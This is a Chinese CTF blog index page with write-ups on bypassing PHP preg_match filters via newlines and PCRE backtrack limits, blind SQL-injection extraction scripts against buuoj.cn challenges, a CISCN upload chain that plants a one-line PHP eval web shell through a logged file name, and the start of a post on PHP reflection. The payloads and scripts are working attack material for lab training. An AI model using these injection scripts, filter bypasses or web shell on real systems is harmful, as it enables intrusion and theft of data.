<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="vague huang"><meta name="copyright" content="vague huang"><title>Tlife</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">vague huang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">194</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tlife</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Tlife</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/22/postpreg-replace%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/">preg_replace函数绕过</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-22</time><div class="content"><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>今天利用这道题来整理一下preg_match的绕过姿势<br><strong>首先我们来看看preg_match的返回值有什么:</strong><br>1.返回1<br>2.返回0<br>3.返回false</p>
<p>设想一下，如果preg_match作为判断条件，用来匹配危险字符，如果匹配到则为1此时我们就被waf掉了，如果是返回错误以及0，这就意味着着我们绕过了！</p>
<h2 id="0篇"><a href="#0篇" class="headerlink" title="0篇"></a>0篇</h2><p>接着，<strong>我们来看看有什么条件可以使我们匹配到0：</strong><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210522135857.png" alt="img" style="zoom:67%;"></p>
<p>根据文档我们可以发现，如果没有s的话，匹配到换行符，preg_match就会停止匹配（preg_match尽力匹配第一行）<br><strong>利用点:</strong><br>如果此时在我们的语句前加入一个换行符，那么此时的我们语句将不会被匹配到，前提preg_match模式符中没有添加s。<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210522140814.png" alt="img" style="zoom: 50%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210522140748.png" alt="img" style="zoom: 50%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210522140814.png" alt="img" style="zoom: 50%;"></p>
<p><strong>payload:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;cmd&quot;:&quot;%0A&quot;cmd&quot;:&quot;&#x2F;bin&#x2F;cat%20&#x2F;home&#x2F;rceservice&#x2F;flag&quot;%0A&quot;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="false篇"><a href="#false篇" class="headerlink" title="false篇"></a>false篇</h2><h3 id="贪婪与非贪婪模式"><a href="#贪婪与非贪婪模式" class="headerlink" title="贪婪与非贪婪模式"></a>贪婪与非贪婪模式</h3><p>贪婪模式：可以这样认为，就是在整个表达式匹配成功的前提下，尽可能多的匹配，也就是所谓的“贪婪”，通俗点讲，就是看到想要的，有多少就捡多少，除非再也没有想要的了。<br>非贪婪模式：可以这样认为，就是在整个表达式匹配成功的前提下，尽可能少的匹配，也就是所谓的“非贪婪”，通俗点讲，就是找到一个想要的捡起来就行了，至于还有没有没捡的就不管了。</p>
<h4 id="贪婪模式："><a href="#贪婪模式：" class="headerlink" title="贪婪模式："></a>贪婪模式：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$str = <span class="string">&#x27;this a img &lt;img src=&quot;mypic.jpg&quot;/&gt; , goog jpg ha ha&#x27;</span>;</span><br><span class="line">preg_match(<span class="string">&#x27;/src.*jpg/&#x27;</span>, $str, $match);</span><br><span class="line">var_dump($match);</span><br></pre></td></tr></table></figure>

<p>输出结果:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(28) &quot;src&#x3D;&quot;mypic.jpg&quot;&#x2F;&gt; , goog jpg&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为是贪婪模式，所以这里多数除了一个jpg</p>
<h4 id="非贪婪模式："><a href="#非贪婪模式：" class="headerlink" title="非贪婪模式："></a>非贪婪模式：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$str = <span class="string">&#x27;this a img &lt;img src=&quot;mypic.jpg&quot;/&gt; , goog jpg ha ha&#x27;</span>;</span><br><span class="line">preg_match(<span class="string">&#x27;/src=&quot;.*?\.jpg&quot;/&#x27;</span>, $str, $match);</span><br><span class="line">var_dump($match);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">15</span>) <span class="string">&quot;src=&quot;</span>mypic.jpg<span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以通过添加惰性限定符或修饰符进行处理</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210522141957.png" alt="img"></p>
<h4 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h4><p>由于是非贪婪模式，所以有回溯的概念的存在：<br>举个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$str = <span class="string">&#x27;this a img &lt;img src=&quot;mypic.jpg&quot;/&gt; , goog jpg ha ha&#x27;</span>;</span><br><span class="line">preg_match(<span class="string">&#x27;/src=&quot;.*?\.jpg&quot;/&#x27;</span>, $str, $match);</span><br><span class="line">var_dump($match);</span><br></pre></td></tr></table></figure>

<p>理解一下，大概是这个意思首先.<em>？在这里匹配的是src和.jpg之间的内容，那么匹配的流程是这样的：首先.\</em>？匹配到“=”号，此时=号满足，放入备选录当中，接下来将匹配控制权交给jpg，发现这个=号不满足，于是回溯给.*？让它匹配了，所以最终结果就是src=”mypic.jpg”</p>
<h4 id="次数限制"><a href="#次数限制" class="headerlink" title="次数限制"></a>次数限制</h4><p>回溯也不是想回多少次就回多少次，</p>
<p>在PHP中，正则匹配的递归次数由 <a target="_blank" rel="noopener" href="http://php.net/manual/en/pcre.configuration.php#ini.pcre.backtrack-limit">pcre.backtrack_limit</a> 控制 <strong>PHP5.3.7</strong> 版本之前默认值为 <strong>10万</strong> ，<strong>PHP5.3.7</strong> 版本之后默认值为 <strong>100万</strong> ，该值可以通过php.ini设置，也可以通过 <strong>phpinfo</strong> 页面查看。<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210522144601.png" alt="img" style="zoom:50%;"><br>如上所示，当我们超过回溯次数，此时返回的就是<strong>false</strong></p>
<h4 id="演示："><a href="#演示：" class="headerlink" title="演示："></a>演示：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data &#x3D; &#39;&lt;?php phpinfo();aaaaa&#39;.str_repeat(&#39; &#39;,1000000);</span><br><span class="line">$a&#x3D;preg_match(&#39;&#x2F;&lt;\?.*[(&#96;;?&gt;].*&#x2F;is&#39;, $data,$data1);</span><br><span class="line">print_r($a);</span><br><span class="line">print_r($data1);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>此时就匹配不到了<br>脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">payload &#x3D; &#39;&#123;&quot;cmd&quot;:&quot;&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag &quot;,&quot;a&quot;:&quot;&#39; + &quot;a&quot;*(1000000) + &#39;&quot;&#125;&#39;</span><br><span class="line">res &#x3D; requests.post(&quot;http:&#x2F;&#x2F;c7f06821-9d9b-468e-9f9f-21c3454d5c7d.node3.buuoj.cn&#x2F;&quot;, data&#x3D;&#123;&quot;cmd&quot;:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.liuhaolin.com/php/195.html">https://www.liuhaolin.com/php/195.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/phpfenghuo/article/details/17316645">https://blog.csdn.net/phpfenghuo/article/details/17316645</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/15/buuctf15/">buuctf15</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-15</time><div class="content"><h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>这题sql注入，过滤了空格测试语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#x2F;**&#x2F;and&#x2F;**&#x2F;1&#x3D;1</span><br><span class="line">1&#x2F;**&#x2F;and&#x2F;**&#x2F;1&#x3D;2</span><br></pre></td></tr></table></figure>

<p>盲注：需要写脚本=：<br>构造payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#x2F;**&#x2F;and&#x2F;**&#x2F;substr(database(),1,1)&#x3D;&#39;1&#39;--</span><br></pre></td></tr></table></figure>

<p>学习一下使用二分法进行爆破</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;b2b3ad31-796e-489d-8ad3-3dc8c3fc8257.node3.buuoj.cn&#x2F;?stunum&#x3D;&quot;</span><br><span class="line">s&#x3D;requests.session()</span><br><span class="line">database&#x3D;&quot;&quot;</span><br><span class="line">for i in range(1,10000):</span><br><span class="line">    low &#x3D;32</span><br><span class="line">    high&#x3D;128</span><br><span class="line">    mid&#x3D;(low+high)&#x2F;&#x2F;2</span><br><span class="line">    while(low&lt;high):</span><br><span class="line">        #payload_1&#x3D;f&quot;1&#x2F;**&#x2F;and&#x2F;**&#x2F;ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;</span><br><span class="line">        #payload_2&#x3D;f&quot;1&#x2F;**&#x2F;and&#x2F;**&#x2F;ascii(substr((select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;&#39;ctf&#39;),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;</span><br><span class="line">        #payload_3&#x3D;f&quot;1&#x2F;**&#x2F;and&#x2F;**&#x2F;ascii(substr((select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;flag&#39;),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;</span><br><span class="line">        payload_4&#x3D; f&quot;1&#x2F;**&#x2F;and&#x2F;**&#x2F;ascii(substr((select&#x2F;**&#x2F;value&#x2F;**&#x2F;from&#x2F;**&#x2F;flag),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;</span><br><span class="line">        if &quot;Hi admin&quot; in s.get(url+payload_4).text:</span><br><span class="line">            low &#x3D; mid+1</span><br><span class="line">        else:</span><br><span class="line">            high&#x3D;mid</span><br><span class="line">        mid&#x3D;(low+high)&#x2F;&#x2F;2</span><br><span class="line">    if(mid&#x3D;&#x3D;32 or mid&#x3D;&#x3D;132):</span><br><span class="line">        break</span><br><span class="line">    database +&#x3D;chr(mid)</span><br><span class="line">    print(database)</span><br><span class="line">print(database)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>二分法快了不是一倍两倍– 真的超级快==</p>
<h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p>让我们以admin的方式登录，并且提示cookie，所以我就在cookie里添加，username=admin，就可以拿到flag了</p>
<h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>输入json类型数据:<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/skysoot/archive/2012/04/17/2453010.html">https://www.cnblogs.com/skysoot/archive/2012/04/17/2453010.html</a></p>
<p>测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;&#x2F;&#x2F;有回显</span><br></pre></td></tr></table></figure>

<p>然后想cat却不行，应该是有过滤==，然后去看了一下wp，说是比赛的时候有源码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>确实是过滤了很多内容</p>
<p>考点分析一下:</p>
<p><strong>1.如何绕过过滤？</strong><br>绕过preg_match方法有两种:<br>(1).preg_match会去努力的去匹配第一行，所以我们可以利用多行的方式进行绕过:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">cmd&#x3D;&#123;</span><br><span class="line">           &quot;cmd&quot;:&quot;&#x2F;bin&#x2F;cat%20&#x2F;home&#x2F;rceservice&#x2F;flag&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也可以直接加一个**%0A**这个也是代表换行符<br>(2).利用PCRE回溯绕过<br>脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag &quot;,&quot;a&quot;:&quot;&#x27;</span> + <span class="string">&quot;a&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">res = requests.post(<span class="string">&quot;http://c7f06821-9d9b-468e-9f9f-21c3454d5c7d.node3.buuoj.cn/&quot;</span>, data=&#123;<span class="string">&quot;cmd&quot;</span>:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<p><strong>2.为什么我们无法使用cat命令？</strong><br>putenv(‘PATH=/home/rceservice/jail’)根据这行源码，读出jail应用于当前环境，我们能使用ls应该是 jali包含了执行二进制文件，所以我们可以直接拉出cat的路径:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;cmd&quot;: &quot;</span><br><span class="line">&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag</span><br><span class="line">&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用</p>
<p>通过以上成功拿到flag</p>
<h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><p>image.php.bak源码泄露:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;﻿?php</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">&quot;id&quot;</span>])?$_GET[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">&quot;path&quot;</span>])?$_GET[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="string">&quot;./&quot;</span> . $row[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>

<p>首先进行绕过，这里测试一下绕过语句:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from images where id&#x3D;&#39;&#39; or path&#x3D;&#39;&#39;;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id=<span class="string">&quot;\\0&quot;</span>;</span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$id);</span><br><span class="line"><span class="keyword">print</span>($id);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\</span><br></pre></td></tr></table></figure>

<p>可见当我们输入\\0的时候最终的结果是\逃逸出来了，设想一下，如果我们在id输入这个，那么久会变成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from images where id&#x3D;&#39;\&#39; or path&#x3D;&#39;&#39;;</span><br><span class="line">此时后面那个单引号被转义，变成是id&#x3D;\&#39; or path&#x3D;&#39;</span><br><span class="line">如果我们在path后插入注入语句or 1&#x3D;1#，将变成</span><br><span class="line">id&#x3D;&#39;\&#39; or path&#x3D;&#39; or 1&#x3D;1#&#39; </span><br></pre></td></tr></table></figure>

<p>这里贴一下盲注脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://803aae5e-79fb-4520-960c-d67666295f67.node3.buuoj.cn/image.php?id=\\0&amp;path=&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">payload = <span class="string">&quot; or ascii(substr((select password from users),&#123;&#125;,1))&gt;&#123;&#125;%23&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    high=<span class="number">127</span></span><br><span class="line">    low=<span class="number">32</span></span><br><span class="line">    mid= (low+high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(high&gt;low):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;JFIF&#x27;</span> <span class="keyword">in</span> s.get(url+payload.format(i,mid)).text:</span><br><span class="line">        low=mid+<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        high=mid</span><br><span class="line">        mid=(low+high)//<span class="number">2</span></span><br><span class="line">        result +=chr(mid)</span><br><span class="line">        print(result)</span><br></pre></td></tr></table></figure>

<p>跑出账号密码，登陆以后发现可以上传文件：<br>随便上传了一个内容:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I logged the file name you uploaded to logs&#x2F;upload.d74bd5e2a76d1aa9b34f21ca9e866a8b.log.php. LOL</span><br></pre></td></tr></table></figure>

<p>无法上传php文件<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210522201428.png" alt="img"></p>
<p>但是可以发现 我们存入的文件名都出现在了这个php文件当中<br>如果我们传入一句话木马文件名，那么就会被这个php解析了</p>
<p>由于php被过滤了，所以这里我们使用短标签进行绕过:<br>burp抓包，改文件名为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?&#x3D;@eval($_POST[&#39;a&#39;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>POST数据或者蚁剑连接都行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;system(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>有点久没刷题了、。。罪过，这次也是收获了不少，感觉sql的调试技巧有点遗忘了，直接复制代码会本地测试就行了~</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/15/CTF%E4%B8%AD%E7%9A%84php%E5%8F%8D%E5%B0%84/">CTF中的php反射</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-15</time><div class="content"><h2 id="反射是什么？"><a href="#反射是什么？" class="headerlink" title="反射是什么？"></a><strong>反射是什么？</strong></h2><p>它是指在PHP运行状态中，扩展分析PHP程序，导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取的信息以及动态调用对象的方法的功能称为反射API。反射是操纵面向对象范型中元模型的API，其功能十分强大，可帮助我们构建复杂，可扩展的应用。</p>
<p>其用途如：自动加载插件，自动生成文档，甚至可用来扩充PHP语言。</p>
<p>PHP反射api由若干类组成，可帮助我们用来访问程序的元数据或者同相关的注释交互。借助反射我们可以获取诸如类实现了那些方法，创建一个类的实例（不同于用new创建），调用一个方法（也不同于常规调用），传递参数，动态调用类的静态方法。</p>
<p>反射api是PHP内建的OOP技术扩展，包括一些类，异常和接口，综合使用他们可用来帮助我们分析其它类，接口，方法，属性，方法和扩展。这些OOP扩展被称为反射。</p>
<p>平常我们用的比较多的是 <strong>ReflectionClass类</strong> 和 <strong>ReflectionMethod类</strong>，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php&#96;&#96;class&#96; &#96;Person&#96;&#96;&#123;&#96;&#96;  &#96;&#96;&#x2F;**&#96;&#96;   &#96;&#96;* For the sake of demonstration, we&quot;re setting this private&#96;&#96;   &#96;&#96;*&#x2F;&#96;&#96;  &#96;&#96;private&#96; &#96;$_allowDynamicAttributes&#96; &#96;&#x3D; false;&#96; &#96;  &#96;&#96;&#x2F;**&#96;&#96;   &#96;&#96;* type&#x3D;primary_autoincrement&#96;&#96;   &#96;&#96;*&#x2F;&#96;&#96;  &#96;&#96;protected&#96; &#96;$id&#96; &#96;&#x3D; 0;&#96; &#96;  &#96;&#96;&#x2F;**&#96;&#96;   &#96;&#96;* type&#x3D;varchar length&#x3D;255 null&#96;&#96;   &#96;&#96;*&#x2F;&#96;&#96;  &#96;&#96;protected&#96; &#96;$name&#96;&#96;;&#96; &#96;  &#96;&#96;&#x2F;**&#96;&#96;   &#96;&#96;* type&#x3D;text null&#96;&#96;   &#96;&#96;*&#x2F;&#96;&#96;  &#96;&#96;protected&#96; &#96;$biography&#96;&#96;;&#96; &#96;  &#96;&#96;public&#96; &#96;function&#96; &#96;getId()&#96;&#96;  &#96;&#96;&#123;&#96;&#96;    &#96;&#96;return&#96; &#96;$this&#96;&#96;-&gt;id;&#96;&#96;  &#96;&#96;&#125;&#96; &#96;  &#96;&#96;public&#96; &#96;function&#96; &#96;setId(&#96;&#96;$v&#96;&#96;)&#96;&#96;  &#96;&#96;&#123;&#96;&#96;    &#96;&#96;$this&#96;&#96;-&gt;id &#x3D; &#96;&#96;$v&#96;&#96;;&#96;&#96;  &#96;&#96;&#125;&#96; &#96;  &#96;&#96;public&#96; &#96;function&#96; &#96;getName()&#96;&#96;  &#96;&#96;&#123;&#96;&#96;    &#96;&#96;return&#96; &#96;$this&#96;&#96;-&gt;name;&#96;&#96;  